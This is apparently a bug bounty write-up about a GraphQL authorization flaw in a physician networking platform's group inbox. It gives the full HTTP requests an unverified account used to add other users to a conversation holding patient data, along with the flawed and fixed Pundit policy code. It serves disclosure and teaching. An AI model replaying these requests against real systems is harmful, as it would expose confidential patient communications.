# I Couldn’t Read the Chat, So I Invited Someone Who Could

- **Source URL:** https://medium.com/@Tyrion404/i-couldnt-read-the-chat-so-i-invited-someone-who-could-105025a7d5ac
- **Fetched from:** https://medium.com/@Tyrion404/i-couldnt-read-the-chat-so-i-invited-someone-who-could-105025a7d5ac?source=rss-b769089fe860------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14952 (id 14952)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Tyrion404 / Sun, 18 Oct 2026 11:16:11 GMT

*A Tyrion404 writeup — on medical secrets, a broken door policy, and the ghost who could open the room to anyone.*

Some doors have two locks. One proves who you are. The other decides what you’re allowed to do.

This one had the first lock. Not the second.

The target is a professional network for physicians and clinicians — the medical equivalent of LinkedIn, but with real patient communications running through it. Its Inbox system allows clinicians to hold group conversations: coordinating care, sharing lab results, discussing cases. These conversations can contain patient names, diagnoses, test results, and clinical decisions.

To understand where the bug lives, you need to understand how the platform models access. There are two layers that matter:

**Layer 1 — Account verification status.** Accounts on this platform go through a verification process. A *verified* clinician has confirmed their identity and credentials. An *unverified* provider account exists in the system but hasn’t been credentialed. Unverified accounts have restricted access across the platform — and specifically, they are denied inbox entitlements by default.

**Layer 2 — Conversation participation.** Separately from account-level verification, a user can hold *participant status* in a specific conversation. This happens when a verified clinician adds them — a distinct action that gives the account a seat in the conversation, tracked in the conversation’s participant list.

Here’s the key distinction the bug exploits: **participant status and inbox entitlement are not the same thing.** A user can be a participant — their ID is in the conversation’s member list — while simultaneously being denied the inbox permissions that allow them to actually read or write. The platform is designed this way intentionally. Being added to a room doesn’t mean you’re authorized to use it.

Authorization for inbox operations is enforced through three separate policy classes in the backend, each responsible for a different operation:

The first two policies were implemented and working. The third was absent. addParticipantsToGroupConversation checked only whether the caller was authenticated and held participant status — it never asked whether the caller had inbox entitlement. Which means an unverified participant, denied both reading and writing, could still call the mutation that determines who else gets access.

Three accounts. All on the staging environment. No real patient data involved.

Before demonstrating the exploit, the authorization state had to be established with precision. Two independent control tests, both using ATK’s token, were run to confirm that ATK’s inbox entitlements were genuinely absent — not just untested.

**Control A — message sending blocked:**

ATK attempts to send a message to the conversation. The backend evaluates this against Inbox::MessagePolicy#write — the policy that checks whether the caller holds the communication.messages.write permission.

POST /\[REDACTED\]/graphql HTTP/1.1

Host: \[REDACTED\]

Authorization: Bearer \<ATK\_TOKEN>

Content-Type: application/json

{"query":"mutation{sendMessage(input:{conversationId:\"\[REDACTED\_UUID\]\",body:\"test\"}){success}}"}

```
{
  "errors": [{
    "message": "Unauthorized access to type Inbox_SendMessage",
    "extensions": {
      "[REDACTED]": {
        "aggregated": {
          "pundit_policy.check.failed": [{
            "warn": "Requires Permissions: [\"communication.messages.write\"]",
            "type": "permissions"
          }, {
            "kind": "type",
            "name": "Inbox_SendMessage",
            "pundit_policy_class": "Inbox::MessagePolicy",
            "pundit_role": "write"
          }]
        }
      }
    }
  }],
  "data": null
}
```
The error response is explicit: pundit\_policy\_class: Inbox::MessagePolicy, pundit\_role: write. Pundit is the Rails authorization library the backend uses. This error means the MessagePolicy#write? method evaluated to false for ATK — the account lacks the communication.messages.write permission. **ATK cannot send messages.**

**Control B — conversation read blocked:**

ATK attempts to read the conversation’s metadata. The backend evaluates this against Inbox::ConversationPolicy#show\_permission — the policy that controls whether a user can access a conversation's content.

POST /\[REDACTED\]/graphql HTTP/1.1

Host: \[REDACTED\]

Authorization: Bearer \<ATK\_TOKEN>

Content-Type: application/json

{"query":"query{conversation(uuid:\"\[REDACTED\_UUID\]\"){id subject}}"}

```
{
  "errors": [{
    "message": "Unauthorized access to type Inbox_Conversation",
    "extensions": {
      "[REDACTED]": {
        "aggregated": {
          "pundit_policy.check.failed": [{
            "kind": "type",
            "name": "Inbox_Conversation",
            "pundit_policy_class": "Inbox::ConversationPolicy",
            "pundit_role": "show_permission"
          }]
        }
      }
    }
  }],
  "data": {"conversation": null}
}
```
Again explicit: pundit\_policy\_class: Inbox::ConversationPolicy, pundit\_role: show\_permission. The ConversationPolicy#show\_permission? method evaluated to false — ATK cannot see the conversation or any of its messages. Note that this is a *different policy class* from the one that blocked message sending. The platform enforces read and write through independent checks, not a single permission gate.

Two policy classes. Two independent denied operations. ATK’s inbox entitlement was confirmed absent before a single exploit step was run.

DO, a legitimate authorized participant, read the conversation to establish ground truth:

POST /\[REDACTED\]/graphql HTTP/1.1

Host: \[REDACTED\]

Authorization: Bearer \<DO\_TOKEN>

Content-Type: application/json

{"query":"query{conversation(uuid:\"\[REDACTED\_UUID\]\"){subject messages{edges{node{... on Inbox\_Message{id body createdAt}}}}}}"}

```
{
  "data": {
    "conversation": {
      "subject": "Group case discussion",
      "messages": {
        "edges": [
          {"node": {"body": "Patient case: Labs indicate elevated troponin. Follow-up with cardiology ordered.", "createdAt": "2026-08-28T18:47:52Z"}},
          {"node": {"body": "POST-JOIN MESSAGE: patient needs ICU transfer", "createdAt": "2026-08-15T07:07:46Z"}},
          {"node": {"body": "Patient [REDACTED], labs show elevated troponin - please review urgently", "createdAt": "2026-08-15T07:07:04Z"}},
          {"node": {"body": "Group message test", "createdAt": "2026-08-14T21:31:53Z"}}
        ]
      }
    }
  }
}
```
12 messages total. Oldest dated to 2026–08–14. Content included patient identifiers and clinical information. This is what an authorized participant could see. This is exactly what an unauthorized injection would expose.

MD was removed from the conversation using an authorized removal call, to establish a clean baseline: MD had no participant status before the exploit, and no access to the conversation.

MD’s read attempt — before injection:

POST /\[REDACTED\]/graphql HTTP/1.1

Host: \[REDACTED\]

Authorization: Bearer \<MD\_TOKEN>

Content-Type: application/json

{"query":"query{conversation(uuid:\"\[REDACTED\_UUID\]\"){id subject messages{edges{node{... on Inbox\_Message{id body createdAt}}}}}}"}

MD is not a participant. Denied. Baseline confirmed.

ATK — denied read access and denied message sending — called addParticipantsToGroupConversation with MD's user ID:

POST /\[REDACTED\]/graphql HTTP/1.1

Host: \[REDACTED\]

Authorization: Bearer \<ATK\_TOKEN>

Content-Type: application/json

{"query":"mutation{addParticipantsToGroupConversation(input:{conversationId:\"\[REDACTED\_UUID\]\",userIds:\[\"\[REDACTED\_MD\_ID\]\"\]}){success errors{attribute messages}}}"}

`{"data": {"addParticipantsToGroupConversation": {"success": true, "errors": []}}}`
success: true.

The mutation accepted the request. No entitlement check. No role check. No ownership check. ATK — the account that couldn’t read the conversation and couldn’t send a message — had just granted a third party full participant access.

MD’s read attempt — the **identical request** that returned Unauthorized in Act III — now after being injected by ATK:

```
{
  "data": {
    "conversation": {
      "subject": "Group case discussion",
      "messages": {
        "edges": [
          {"node": {"body": "Patient case: ************"}},
          {"node": {"body": "Patient follow-up: *************"}},
          {"node": {"body": "Confirming patient follow-up for case", }},
          {"node": {"body": "POST-JOIN MESSAGE: patient needs **********"}},
          {"node": {"body": "Patient [REDACTED], **********"}},
          {"node": {"body": "Group message test"**************"}}
        ]
      }
    }
  }
}
```
The identical 12-message history that DO saw in Act II. Including every message sent before MD was added. The same request that returned Unauthorized access to type Inbox\_Conversation minutes earlier now returned the full conversation, including historical patient clinical communications.

MD — just injected by ATK — immediately called the same mutation to add a third clinician with no prior relationship to the conversation:

POST /\[REDACTED\]/graphql HTTP/1.1

Host: \[REDACTED\]

Authorization: Bearer \<MD\_TOKEN>

Content-Type: application/json

{"query":"mutation{addParticipantsToGroupConversation(input:{conversationId:\"\[REDACTED\_UUID\]\",userIds:\[\"\[REDACTED\_USER\_ID\]\"\]}){success errors{attribute messages}}}"}

success: true. Again.

The chain: **ATK (no authorization) → grants MD access → MD grants a third clinician access**. Two calls. No approval gate at either step. The mutation accepted an array of user IDs and could be called repeatedly, expanding access to any verified clinician on the platform.

The backend uses Pundit — a Ruby authorization library — to enforce per-operation access control. For each GraphQL mutation or query, Pundit evaluates a *policy method* that returns true (allow) or false (deny). The question is: what conditions did each policy method actually check?

For the two operations ATK was denied:

\# Inbox::MessagePolicy — sendMessage

def write?

authenticated? && has\_entitlement?(:inbox\_write) && participant\_in?(conversation)

end

\# Inbox::ConversationPolicy - read conversation

def show\_permission?

authenticated? && has\_entitlement?(:inbox\_read) && participant\_in?(conversation)

end

Both policies required three things: the caller is authenticated, the caller holds an inbox entitlement, *and* the caller is a participant. All three gates had to pass.

For addParticipantsToGroupConversation, the policy looked like this:

\# Inbox::GroupConversationPolicy — addParticipants (actual, before fix)

def add\_participants?

authenticated? && participant\_in?(conversation)

# has\_inbox\_entitlement? never called

end

The second gate — has\_inbox\_entitlement? — was never checked. Participant status alone was sufficient.

This is the exact mismatch:

sendMessage:              authenticated? AND has\_inbox\_entitlement? AND participant\_in?  ✓

read conversation: authenticated? AND has\_inbox\_entitlement? AND participant\_in? ✓

addParticipants: authenticated? AND participant\_in? ← BUG

The result: an unverified account that was denied both reading and writing — because it lacked has\_inbox\_entitlement? — could still call the mutation that controls who gets participant status, because that mutation never consulted the entitlement check.

Participant status is the **prerequisite** for the bug, not the **authorization** for the action. Being in the room was enough to decide who else got a key.

The fix was one line in one policy method:

\# After fix

def add\_participants?

authenticated? && has\_entitlement?(:inbox\_write) && participant\_in?(conversation)

end

One condition. The same condition that already existed on every other inbox operation. It was simply missing here.

Group Conversation

┌─────────────────────────────────────────────────────┐

│ Messages (incl. patient clinical content) │

│ ● "Labs indicate elevated troponin..." │

│ ● "Patient needs ICU transfer" │

│ ● "Please review urgently" │

└─────────────────────────────────────────────────────┘

▲ ▲

│ AUTHORIZED READ │ ???

│ │

\[ DO \] \[ MD \]

Legitimate participant NOT a participant

Denied by policy

\[ ATK \] — Unverified participant

│

├─ sendMessage ──────────────── BLOCKED ✗

│ (Inbox::MessagePolicy)

│

├─ read conversation ────────── BLOCKED ✗

│ (Inbox::ConversationPolicy)

│

└─ addParticipants(MD) ─────── SUCCESS ✓ ← BUG

│ (no entitlement check)

▼

\[ MD \] now has participant status

│

└─ reads full conversation ──── SUCCESS ✓

│ (all 12 messages, incl. history)

│

└─ addParticipants(\[THIRD\_CLINICIAN\]) ─── SUCCESS ✓

(chain propagates indefinitely)

The authorization model was sound in design. Two separate policy classes protected two separate operations — reading and writing. The gap was a third operation, in the same authorization family, that was never wired to either of those policies.

addParticipantsToGroupConversation was protected by a presence check, not an entitlement check. Being in the conversation proved you were there — it said nothing about whether you were authorized to change who else could be there. On a platform where conversations carry patient clinical content, the distinction between "you're a participant" and "you're authorized" is not a technical edge case. It's the entire security model.

The fix was one missing condition in one policy method. The damage, on production, could have been HIPAA-scope: unauthorized disclosure of patient identifiers, diagnoses, and clinical decisions to clinicians with no treating relationship to those patients, with no notification to the conversation owners, and with a propagating chain that could expand access arbitrarily.

One condition. One mutation. One door that should have had two locks.

Tyrion has always known that the most dangerous person in the room isn’t the one with the sword. It’s the one who can decide who else gets to walk in.

*“I have a gift for you — the truth about the world, and all the things that dwell in it.”*
